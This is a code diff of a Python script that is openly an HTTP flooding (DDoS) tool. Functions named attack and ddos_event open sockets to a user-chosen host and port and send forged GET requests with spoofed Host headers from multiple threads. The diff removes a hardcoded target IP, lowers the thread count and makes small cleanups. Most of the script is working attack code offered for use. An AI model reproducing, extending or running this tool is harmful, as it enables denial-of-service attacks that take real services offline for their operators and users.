@@ -3,7 +3,7 @@
 import hashlib, json, os, random, socket, sys, time ,uuid
 # from threading import Thread
 from requests import get
-
+import threading
 #
 hello = '''
 
@@ -31,20 +31,22 @@ user_agent = ps4
 # hostname = platform.node()
 #
 # PAUSE
+#
+# server testing script. Your ip is visible.
 
 workstat = os.uname()[0]
 hostname = os.uname()[1]
 platform = os.uname()[2]
 username = os.environ.get('USERNAME')
 admin = str(os.getlogin()).replace('K', 'k').replace('l', 'L')
-MAC = hex(uuid.getnode());
+MAC = hex(uuid.getnode())
 WHO = f"{admin} wAS hERE"
 
 BLOB = ["Hanna Sofea's comrade \ written by kwafelt", "10v3{5h371x1}"]
 FLAG = BLOB[1]
 ROOT = [""]
 HTTP = ['HTTP/1.0','HTTP/1.1','HTTP/2']
-HOST = ['writ.er.ws','search.censys.io']
+HOST = ['search.censys.io:443','httpbin.org:443']
 CONN = ['close','Keep-Alive']
 TEXT = ["Injecting process"]
 
@@ -53,18 +55,11 @@ target_host = None
 target_port = None
 delay = 0.75
 
-TARGET_IP = '80.179.151.134'; status = 'dorman'
-#
-
 question = 'Do you want to continue ?'
 confirm = ['Do you want to continue ?','Is this ok ?']
 
-# parse_input
-num_requests = 0;
-thread_num = 0;
-
 def color(r, g, b, text):
-  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text);
+  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text)
 
 def title(c):
   if (c == 'start'): terminal_title = BLOB[0]
@@ -75,6 +70,9 @@ def write(c):
   return sys.stdout.write(c)
 
 def ossys(c):
+  if (workstat == "windows"):
+    c = str(c).replace("clear","cls")
+  else: pass
   return os.system(c)
 
 def timer(c):
@@ -110,7 +108,7 @@ def parse(init):
   global p1
   if (len(sys.argv) == 3):
     global target_host; global target_port
-    FQDN = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    FQDN = str(sys.argv[1]).replace("https://", "").replace("http://", "")
     target_host = str(socket.gethostbyname(FQDN))
     target_port = int(sys.argv[2])
     p1 = [sys.argv[0], sys.argv[1], target_port]
@@ -125,8 +123,8 @@ def verif(init):
     r = socket.gethostbyname(target_host); s = socket.create_connection((r, target_port), 2)
     start(init)
   except (IOError, OSError):
-    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
-    write(f'\r\n {txt}\r\n');
+    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT')
+    write(f'\r\n {txt}\r\n')
     reset(0)
   finally: pass
 
@@ -249,7 +247,7 @@ def attack(init):
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
     try:
       address = (target_host, target_port)
-      proc.settimeout(2.2); proc.connect(address)
+      proc.settimeout(3.0); proc.connect(address)
       b1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nAccept: application/json, text/plain, */*\r\n'
       b2 = f'Accept-Encoding: gzip, deflate\r\nAccept-Language: en-us, en\r\nConnection: {CONN[1]}\r\n'
       b3 = f'Keep-Alive: timeout=10, max=100\r\nUser-Agent: {user_agent}\r\n\r\n'
@@ -285,8 +283,8 @@ def process(count):
   return
 
 def ddos_event(count):
-  for i in range(115):
-    thread = threading.Thread(target=process_pro);
+  for i in range(3):
+    thread = threading.Thread(target=process_pro)
     thread.start()
 def process_pro():
   attack(1)
@@ -294,10 +292,11 @@ def process_pro():
 
 ################################################################################
 try:
-  parse(0); BLOB = True
+  parse(0)
 except (KeyboardInterrupt, IOError, OSError):
-  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
-  write(f'\n {tx1}\r\n'); sys.exit(0)
+  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..')
+  write(f'\n {tx1}\r\n')
+  sys.exit(0)
 except SystemExit as EXIT: pass
-finally: reset(1); sys.exit(1);
+finally: reset(1); sys.exit(1)
 ##############################!TERIMA-KASEH~####################################
